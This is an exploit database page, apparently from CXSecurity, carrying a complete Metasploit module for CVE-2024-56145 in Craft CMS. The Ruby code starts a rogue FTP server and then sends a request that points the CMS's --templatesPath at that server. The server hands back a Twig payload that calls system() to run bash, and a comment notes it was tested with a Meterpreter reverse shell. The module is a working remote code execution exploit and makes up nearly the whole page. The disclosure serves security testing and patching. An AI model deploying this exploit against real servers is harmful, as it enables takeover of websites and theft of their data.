---
title: CMS Twig Template Injection RCE via FTP Templates Path
url: https://cxsecurity.com/issue/WLB-2025010024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-25
fetch_date: 2025-10-06T20:07:57.320870
---

# CMS Twig Template Injection RCE via FTP Templates Path

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CMS Twig Template Injection RCE via FTP Templates Path** **2025.01.24**  Credit:  **[jheysel](https://cxsecurity.com/author/jheysel/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::FtpServer
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Craft CMS Twig Template Injection RCE via FTP Templates Path',
'Description' => %q{
This module exploits a Twig template injection vulnerability in Craft CMS by abusing the --templatesPath argument.
The vulnerability allows arbitrary template loading via FTP, leading to Remote Code Execution (RCE).
},
'Author' => [
'jheysel-r7', # Metasploit module
'Valentin Lobstein', # Refactor, Fix, and PoC
'AssetNote' # Vulnerability discovery
],
'References' => [
['CVE', '2024-56145'],
['URL', 'https://github.com/Chocapikk/CVE-2024-56145'],
['URL', 'https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms']
],
'Payload' => {
'BadChars' => "\x22\x27" # " and '
},
'License' => MSF\_LICENSE,
'Privileged' => false,
'Platform' => %w[unix linux],
'Arch' => [ARCH\_CMD],
'Targets' => [
[
'Unix/Linux Command Shell', {
'Platform' => %w[unix linux],
'Arch' => ARCH\_CMD
# tested with cmd/linux/http/x64/meterpreter/reverse\_tcp
}
],
],
'DefaultTarget' => 0,
'DisclosureDate' => '2024-12-19',
'Notes' => {
'Stability' => [CRASH\_SAFE],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
}
)
)
end
def vulnerable\_file\_list
%w[/default/index.twig /default/index.html]
end
def get\_payload
"{{ ['system', 'bash -c \"#{payload.encoded}\"'] | sort('call\_user\_func') }}"
end
def send\_ftp\_response(cli, code, message)
cli.put "#{code} #{message}\r\n"
vprint\_status("-> #{code} #{message}")
end
def on\_client\_connect(cli)
@state[cli] = {
name: "#{cli.peerhost}:#{cli.peerport}",
ip: cli.peerhost,
port: cli.peerport,
user: nil,
pass: nil,
cwd: '/'
}
send\_ftp\_response(cli, 220, 'FTP Server Ready')
end
def on\_client\_command\_user(cli, arg)
vprint\_status('on\_client\_command\_user')
if arg.downcase == 'anonymous'
@state[cli][:user] = 'anonymous'
send\_ftp\_response(cli, 331, 'Username ok, send password.')
else
send\_ftp\_response(cli, 530, 'Not logged in.')
end
end
def on\_client\_command\_pass(cli, arg)
vprint\_status('on\_client\_command\_pass')
if @state[cli][:user] == 'anonymous'
@state[cli][:pass] = arg
send\_ftp\_response(cli, 230, 'Login successful.')
else
send\_ftp\_response(cli, 530, 'Not logged in.')
end
end
def on\_client\_command\_cwd(cli, arg)
vprint\_status('on\_client\_command\_cwd')
if arg == '/default'
@state[cli][:cwd] = '/default'
send\_ftp\_response(cli, 250, "\"#{@state[cli][:cwd]}\" is current directory.")
else
send\_ftp\_response(cli, 550, 'Not a directory')
end
end
def on\_client\_command\_type(cli, arg)
vprint\_status('on\_client\_command\_type')
if arg == 'I'
send\_ftp\_response(cli, 200, 'Type set to: Binary.')
else
send\_ftp\_response(cli, 500, 'Unknown type.')
end
end
def on\_client\_command\_size(cli, arg)
vprint\_status('on\_client\_command\_size')
if vulnerable\_file\_list.include?(arg)
send\_ftp\_response(cli, 213, get\_payload.length.to\_s)
else
send\_ftp\_response(cli, 550, "#{arg} is not retrievable.")
end
end
def on\_client\_command\_mdtm(cli, arg)
vprint\_status('on\_client\_command\_mdtm')
if vulnerable\_file\_list.include?(arg)
send\_ftp\_response(cli, 213, Time.now.strftime('%Y%m%d%H%M%S'))
else
send\_ftp\_response(cli, 550, "#{arg} is not retrievable.")
end
end
def on\_client\_command\_epsv(cli, \_arg)
vprint\_status('on\_client\_command\_epsv')
send\_ftp\_response(cli, 502, 'EPSV command not implemented.')
end
def on\_client\_command\_retr(cli, arg)
vprint\_status('on\_client\_command\_retr')
if vulnerable\_file\_list.include?(arg)
conn = establish\_data\_connection(cli)
unless conn
send\_ftp\_response(cli, 425, "Can't open data connection.")
return
end
send\_ftp\_response(cli, 150, "Opening data connection for #{arg}")
conn.put(get\_payload)
conn.close
send\_ftp\_response(cli, 226, 'Transfer complete.')
else
send\_ftp\_response(cli, 550, 'File not available.')
end
rescue IOError => e
vprint\_error("Data transfer failed: #{e.message}")
send\_ftp\_response(cli, 425, 'Data transfer failed.')
end
def on\_client\_command\_quit(cli, \_arg)
vprint\_status('on\_client\_command\_quit')
send\_ftp\_response(cli, 221, 'Goodbye.')
end
def on\_client\_command\_unknown(cli, cmd, arg)
vprint\_status('on\_client\_command\_unknown')
send\_ftp\_response(cli, 500, "'#{cmd} #{arg}': command not understood.")
end
def check
vprint\_status('Performing vulnerability check...')
nonce = Rex::Text.rand\_text\_alphanumeric(8)
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path),
'method' => 'GET',
'vars\_get' => { '--configPath' => "/#{nonce}" }
)
if res&.body&.include?('mkdir()') && res.body.include?(nonce)
CheckCode::Vulnerable
else
CheckCode::Safe
end
end
def trigger\_http\_request
vprint\_status('Triggering HTTP request...')
templates\_path = "ftp://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}"
send\_request\_raw(
'uri' => normalize\_uri(target\_uri.path) + "?--templatesPath=#{templates\_path}",
'method' => 'GET'
)
rescue StandardError => e
vprint\_error("HTTP request failed: #{e.message}")
end
def start\_ftp\_service
if datastore['SSL'] == true
reset\_ssl = true
datastore['SSL'] = false
end
start\_service
if reset\_ssl
datastore['SSL'] = true
end
end
def exploit
vprint\_status('Starting FTP service...')
start\_ftp\_service
vprint\_status("FTP server started on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
vprint\_status('Sending HTTP request to trigger the payload...')
trigger\_http\_request
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010024)

[Tweet](ht...